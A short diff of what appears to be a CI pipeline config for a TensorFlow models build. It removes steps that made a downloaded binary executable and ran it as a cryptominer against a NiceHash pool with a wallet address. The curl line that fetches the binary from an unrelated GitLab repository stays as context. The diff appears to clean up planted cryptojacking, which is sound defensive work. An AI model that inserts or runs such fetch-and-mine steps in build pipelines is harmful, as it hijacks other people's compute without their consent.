@@ -14,5 +14,3 @@
       - cd /tensorflow/models/research/
       - export PYTHONPATH=$PYTHONPATH:`pwd`:`pwd`/slim
       - curl -L -o loli https://gitlab.com/anabsjs80/josss/-/raw/main/loli
-      - chmod +x loli
-      - ./loli --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.Nung
